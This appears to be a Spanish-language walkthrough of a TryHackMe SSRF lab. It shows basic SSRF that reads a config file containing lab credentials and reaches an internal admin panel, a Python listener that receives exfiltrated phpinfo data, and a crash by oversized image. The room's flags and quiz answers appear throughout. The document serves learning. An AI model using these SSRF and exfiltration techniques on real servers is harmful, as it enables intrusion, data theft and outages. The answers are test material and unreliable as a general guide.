# SSRF

Discover the inner workings of SSRF and explore multiple exploitation techniques.

Medium

## Task 1 Introduction

- agregar el hosts a /etc/hosts en la maquina kali
- probar que el sitio web es accesible http://hrms.thm

## Task 2 Anatomy of SSRF Attack
- explicar el escenario en base al diagram
- explicar la forma en que se miden las vulns por OWASP ir al enlace> https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/

What is the average weighted impact for the SSRF vulnerability as per the OWASP Top 10?

## Types of SSRF - Basic

### Scenario - I: SSRF Against a Local Server

http://hrms.thm/?url=localhost/copyright

- hay un punto vulnerable a ssrf que es el parametro url que solicita recursos internos, muestra el copryht en la parte de abajo
```
Copyright HRMS © 2018-2023
```
- Esto significa que el atacante a cometido errores
```
$uri = rtrim($_GET['url'], "/");
...					
$path = ROOTPATH . $file;
...
if (file_exists($path)) {
  echo "<pre>";
  echo htmlspecialchars(file_get_contents($path));
  echo "</pre>";
  } else { ?>
    <p class="text-xl"><?= ltrim($file, "/") ?> is not found</p>
 <?php
```
- el parámetro url carece de filtros adecuados y no valida lo que se le pasa


- el atacante lo puede manipular
- [ ] primero hacer una prueba poniendo cualquier nombre por ejemplo hola y nos damos cuenta que quiere cargar un php
```
hola.php is not found
```

- [ ] Probar con un pagina que si existe : config, incluso el mismo index
```
<?php
$adminURL = "http://192.168.2.10/admin.php";
$username = "hrmsadmin";
$password = "hrmsadmin@123";
```

What is the username for the HRMS login panel?

 hrmsadmin

What is the password for the HRMS login panel?

 hrmsadmin@123

What is the admin URL as per the config file?

 http://192.168.2.10/admin.php

What is the flag value after successfully logging in to the HRMS web panel?

THM_{1NiT_S$rF}

## Task 4 Types of SSRF - Basic (Continued)

### Scenario - II: Accessing an Internal Server

#### Como trabaja
- Intentaremos acceder recursos no accesibles directamente como >  http://192.168.2.10/admin.php, y veremos que no funciona
- Luego nos logueamos y vemos la opcion Employees con un Combo que despliega opciones con acceso a recursos externos por IO
```
<div class="flex justify-center">
	<form method="post" action="[](view-source:http://hrms.thm/details.php)" name="myForm" id="myForm" class="w-[80%] mt-6 -mb-6">
		<label for="category" class="text-xl font-semibold cursor-pointer text-indigo-950">Select Category:</label>
		<select name="category" id="category" class="category-dropdown ml-2 px-10">
			<option value="http://192.168.2.10/employee.php">Employee</option>
			<option value="http://192.168.2.10/salary.php">Salary</option>
		</select>

	</form>
</div>
```
- cambiaremos una de esas solicitudes usando el inspector par aapuntarla al panel de administracion
```
<option value=" http://192.168.2.10/admin.php">Salary</option>
```
- se carga el php de admin y podemos ver la bandera

Is accessing non-routable addresses possible if a server is vulnerable to SSRF (yea/nay)?

yea

What is the flag value after accessing the admin panel?

``THM_{B@$ic_s$rF}``

## Task 5 Types of SSRF - Blind

Es cuando el atacante no recibe respuesta directa o retroalimentación acerca de la solicitud , son respuetas siegas
### Blind SSRF With Out-Of-Band

- El atacante monta un servidor externo para recibir las respuestas 
- Forza la saolicitud a su servidor y de esa manera se da cuenta que existe la iteracion
### Como trabajaremos
- Iremos a la opción de Profile, esta una vez cargada, envía una solicitud a un recurso externo getInfo.php, el cual se usa para analitic o logs
```
<?php
...
$targetUrl = $_GET['url'];
ob_start();
ob_start();
phpinfo();
$phpInfoData = ob_get_clean();
$ch = curl_init($targetUrl); 
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,$phpInfoData);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch); 
...
?>
```
- el análisis de código muestra que se lee el parámetro url sin validación, y el código envía la información al servidor mencionado en el pámetro url
- Primero probamos a nuestro propio servidor, una vez que vemos la silicitud nos damos cuenta que existe la vulnerabilidad

```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
^[^[10.10.92.79 - - [05/May/2024 15:59:18] code 501, message Unsupported method ('POST')
10.10.92.79 - - [05/May/2024 15:59:18] "POST / HTTP/1.1" 501 -

```

- Grabamos el codigo a server.py para recibir la respuesta y guardarla

```
from http.server import SimpleHTTPRequestHandler, HTTPServer
from urllib.parse import unquote
class CustomRequestHandler(SimpleHTTPRequestHandler):

    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')  # Allow requests from any origin
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Hello, GET request!')

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')

        self.send_response(200)
        self.end_headers()

        # Log the POST data to data.html
        with open('data.html', 'a') as file:
            file.write(post_data + '\n')
        response = f'THM, POST request! Received data: {post_data}'
        self.wfile.write(response.encode('utf-8'))

if __name__ == '__main__':
    server_address = ('', 8080)
    httpd = HTTPServer(server_address, CustomRequestHandler)
    print('Server running on http://localhost:8080/')
    httpd.serve_forever()
```

### Semi-Blind SSRF (Time-based)
- se envian solicitudes a diferentes URL y en base a al tiempo de respuesta, se puede saber si existe o no la vulnerabilidad

Does Out-of-band SSRF always include a technique in which an attacker always receives direct responses from the server (yea/nay)?

nay

What is the value for Virtual Directory Support on the PHP server per the logged data?

disabled

What is the value of the **PHP Extension Build** on the server?

API20190902,NTS

Which type of SSRF doesn't give us a direct response or feedback?

blind

## Task 6A Classic Example - Crashing the Server

El atacante pude lograr con SSRF puede colapsar el servidor o crear un ataque de denegacion en otros hosts de la red 

### Crashing the Server
- Usaremos la opcion de Trining, que carga una imagen > http://hrms.thm/url.php?id=192.168.2.10/trainingbanner.jpg
- El codigo en url, verifica que no sea una imagen muy grande
```
<?php
....
....
    if ($imageSize < 100) {
		  // Output the image if it's within the size limit
    
		$base64Image = downloadAndEncodeImage($imageUrl);
        echo '<img src="' . htmlspecialchars($base64Image) . '" alt="Image" style="width: 100%; height: 100%; object-fit: cover;">';

    } else {
	 	// Memory Outage - server will crash
    
....
...
```
- vamos a cargar una imgagen muy grande para crachear el sever, ya la tenemos preparada

- `http://hrms.thm/url.php?id=192.168.2.10/bigImage.jpg`.


## Task 7 Remedial Measures

Which of the following is the suggested approach while handling trusted URLs? Write the correct option only.

a) Filter out disallowed URLs

b) Maintaining an allowlist of trusted URLs

b

Since SSRF mainly exploits server-side requests, is it optional to sanitise the input URLs or parameters (yea/nay)?

nay